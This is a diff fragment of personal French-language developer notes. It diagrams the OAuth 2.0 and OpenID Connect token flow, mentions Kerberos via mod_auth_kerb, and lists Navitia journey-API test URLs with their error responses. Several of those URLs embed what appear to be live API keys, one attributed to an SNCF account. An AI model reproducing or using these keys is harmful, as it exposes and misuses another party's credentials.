-                   --->GET                                                                                           
+                                 <<<<<<<<<<<<<<<<<<<<<<<<<-----------backchannel/frontSiImplicitMode--------- FID renvoit l’AccessToken(scopé&expirable)   +                Token_ID si OpenID =JWTSigné=JWS (AuthenticationServer doit supporter)
+                                                               HTTPS-SSL si Bearer                                        expires_in=xms(stokéDsDBSaufSi) +TokenType=      								 Signature avec SecretKey 
+                                                                                                                          stocké en base sauf si durée            bearer                       ou
+                                                                                                                          vie tres courte                                                  Signature avec paire de clé assymetriques (donc clé privée)
+                                                                                                                                                                   ou
+                                                                 pasBesoin si Mac                                           utilisation unique                      mac                          
+                                                                                                                            chaque fois
+    
+    EDSN peut utiliser Token_ID:utilisateur est authentifié.                                                                                                                                   
+    EDSN demande une authorisation                                                                                                                                                              
+                   --->GET                                                                                                                
                    --->GET  plusieurs fois tant que expir OK.
                    --->GET----------backchannel/frontSiImplicitMode-----renvoit l'AccessToken qui contient le scope----------->>>>>>FIDx(Ressource) Vérifie que l'AccessToken est valide Puis Execute l'action ou                                                                                            
                                                   |                       GET url.FIDx/toto/endpoint                                                                            |
-                                                  |                       Authorization:Bearer blablaMonAccessTockenblabla // dans le header                                    | 
+                                                  |                  Authorization:Bearer ou Mac blaMonAccessTockenblabla // dans le header(bearer pour dire que c du oauth2.0) | 
                                                   |                         OU renvoit                                                                                          |
                                                   |                       getUserInfo si a reçu l'Token_ID                                                                      |
                                            s'assurer que le token ne peut pas                                                                                                   | 
                                            être pompé hors du browser                                                                                                           |
                                                                                                                                                                                 |
                           <<<<<<<<<<<<<<<<<<<<---------------------info demandée(restreinte au scope) backchannel---------------------------------------------------------------------retourne------FID(AuthenticationServer) renvoit un RefreshToken à EDSN(Client)
+                          
+                          
+                   client username/password->---------------------------------------------------------------------------------------------------------------------------------------->>>>>>>>>>>> si Bearer,capable revoquer son access token (stoké en base) 
+                          
 
 Kerberos : 
     utilisation de d'apache mod_auth_kerb: 
@@ -32130,6 +32324,9 @@ pour tester les urls ci dessous
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1//journeys?from=2.33245;48.77469&to=2.64788;48.31951 idf-limiteDansIdf OK
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1//journeys?from=2.33245;48.77469&to=2.39107;48.65775 idf vers idf OK
       https://8af43782-3f00-41ef-bd13-57cfdd04e002@api.navitia.io/v1//journeys?from=2.33245;48.77469&to=2.39107;48.65775 test avec compte sncf idf vers idf 
+	  
+												 https://api.navitia.io/v1/journeys?from=2.33245;48.77469&to=2.39107;48.65775&datetime=20190702T170821&datetime_represents=arrival
+	  
       Journey cross coverage
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1/journeys?from=2.33245;48.77469&to=3.30139;48.21735 idf vers droite hors idf   KO Status: Message: cannot find a region with 2.33245;48.77469 and 3.30139;48.21735 in the same time. You have requested this URI [/v1/journeys] but did you mean /v1/journeys or /v1/vehicle_journeys or /v1/routes ? (404), duration of the request: 414ms
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1//journeys?from=2.64788;48.31951&to=3.30139;48.21735 limiteDansIdf vers DroiteHorsIdf KO  cannot find a region with 2.64788;48.31951 and 3.30139;48.21735 in the same time. You have requested this URI [/v1/journeys] but did you mean /v1/journeys or /v1/vehicle_journeys or /v1/routes ? (404), duration of the request: 338ms
